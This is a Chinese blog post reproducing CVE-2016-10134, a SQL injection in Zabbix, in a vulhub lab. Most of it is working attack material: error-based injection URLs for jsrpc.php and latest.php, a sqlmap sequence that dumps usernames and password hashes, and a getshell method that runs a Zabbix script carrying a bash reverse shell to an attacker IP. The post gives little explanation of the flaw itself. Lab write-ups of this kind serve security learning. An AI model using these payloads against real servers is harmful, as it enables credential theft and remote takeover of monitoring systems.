# 漏洞复现-CVE-2016-10134-zabbix sql 注入 - 铺哩 - 博客园

> 原文：[`www.cnblogs.com/cute-puli/p/15659959.html`](https://www.cnblogs.com/cute-puli/p/15659959.html)

# 0x00 实验环境

攻击机：Ubuntu

靶场：vulhub 搭建的靶场环境

# 0x01 影响版本

```
zabbix 2.0.x| 2.2.x| 2.4.x| 3.0.0-3.0.3
```

# 0x02 漏洞复现

**方法一**：存在**guest**空密码账号，无需登录可爆出漏洞：

（1）访问页面：

![](img/07f80cf545257e46a78184a3773a8387.png)

 （2）无需登录，使用注入语句：

```
http://x.x.x.x:8080/jsrpc.php?type=0&mode=1&method=screen.get&profileIdx=web.item.graph&resourcetype=17&profileIdx2=updatexml(0,concat(0xa,user()),0)
```

  （3）爆出用户名与 ip 信息：

```
updatexml(0,concat(0xa,user()),0)
```

![](img/d92704f18184c0f1fc2a42887691d4f3.png)

**方法二**：直接使用**sqlmap**跑一下：

（1）跑出来存在注入：

![](img/ced984789d79bd0bb2972c1e4a802c2f.png)

 （2）跑数据库：

```
python2 sqlmap.py -u "http://x.x.x.x:8080/jsrpc.php?type=0&mode=1&method=screen.get&profileIdx=web.item.graph&resourcetype=17&profileIdx2=*" --dbms=mysql -p "profileIdx2" --technique E --dbs
```

![](img/65bf32ce1f1f6e03481be64415896450.png)

 （3）跑表

```
python2 sqlmap.py -u "http://x.x.x.x:8080/jsrpc.php?type=0&mode=1&method=screen.get&profileIdx=web.item.graph&resourcetype=17&profileIdx2=*" --dbms=mysql -p "profileIdx2" --technique E -D zabbix --tables
```

![](img/fbd0542c11fbedd304f6ec48c79bdd62.png)

 （4）跑列

```
python2 sqlmap.py -u "http://1x.x.x.x:8080/jsrpc.php?type=0&mode=1&method=screen.get&profileIdx=web.item.graph&resourcetype=17&profileIdx2=*" --dbms=mysql -p "profileIdx2" --technique E -D zabbix -T users --columns
```

 ![](img/f9b9af2de4cd31fa8cdb2d9ff23edf38.png)

 （5）跑其列的数据

```
python2 sqlmap.py -u "http://x.x.x.x:8080/jsrpc.php?type=0&mode=1&method=screen.get&profileIdx=web.item.graph&resourcetype=17&profileIdx2=*" --dbms=mysql -p "profileIdx2" --technique E -D zabbix -T users -C userid,name,passwd --dump
```

 ![](img/e6dd7679b0a7691012af9f80c91ef956.png)

 （6）从 md5 查询其结果

 ![](img/9ce190dac99028948b8145a9249efdf2.png)

**方法三**：不同的注入页面，使用不同的注入语句：

```
latest.php?output=ajax&sid=89ef7941e55db49d&favobj=toggle&toggle_open_state=1&toggle_ids[]=updatexml(0,concat(0xa,user()),0)
```

（1）使用（**guest/空**）登录后，获取下图**zbx_sessionid**的**16**位值：

![](img/d892c67224a0537a76d529e6eaafedea.png)

 （2）使用下面的语句进行注入查询

```
http://x.x.x.x:8080/latest.php?output=ajax&sid=89ef7941e55db49d&favobj=toggle&toggle_open_state=1&toggle_ids[]=updatexml(0,concat(0xa,user()),0)
```

![](img/60a935648d08fc5b4a758fe72e3f9f81.png)

** 方法四**：getshell 的话需要设置一下配置文件：

```
docker exec -it acb6e32199fd /bin/sh

这里的 acb6e32199fd 为对应容器的 CONTAINER ID，根据自己电脑修改

vi /etc/zabbix/zabbix_agentd.conf

输入 i 进行编辑，添加 EnableRemoteCommands = 1 后按下 esc 键输入:wq 保存并退出
```

![](img/b2911596baba216f969a9bcf5b5f6ae0.png)

 （1）按照上面的修改一下配置文件：

![](img/45b2b2e1c3080c44819fc2c8a07e344e.png)

 （2）重启容器

```
重启容器   
docker restart acb6e32199fd
```

![](img/baa1fc3170e8e894819b425969cbfde5.png)

（3）使用**admin/zabbix**登录进来：

![](img/fc44449bd6a583d74d60a3d2c69d6c4e.png)

 （4）创建一个 zabbix 的**可执行脚本**（**Administration**--->**Scripts**）

![](img/bfe39c939cb1569d25b08b16c538cbf6.png)

 （4）点击执行（**Monitoring**--->**Latest data**），在“**Select**”处选择所有模块，然后点击“**Filter**”：

![](img/4ebb744704ffcb614fd642b78ffd66bb.png)

 （5）点击“**Zabbix server**” 后点击你创建的那个脚本的名字“**test**”：

![](img/70de6405bfb41e8ed77fd1d7f8d6280c.png)

 （6）执行成功，我这边是因为环境问题，所以没有执行成功，但是**大体步骤就是我上述所示**：

![](img/903155bdb0b64a79a87706b1f466f9ac.png)

 （7）只要将上面的 touch 换成**反弹 shell 的命令**即可：

```
/bin/bash -i > /dev/tcp/攻击机 IP/端口 0<&1 2>&1
```

# 0x03 漏洞原理

 自行研究一下那个 php 文件的注入的地方吧，这个涉及框架啥的，我只想静静地当一只脚本小子。

# 0x04 参考文献

https://blog.csdn.net/qq_43645782/article/details/106588179

# 0x05 免责声明

本漏洞复现文章仅用于学习、工作与兴趣爱好，并立志为网络安全奉献一份力量，凡是利用本博客相关内容的无良**hackers**造成的安全事故均与本人无关！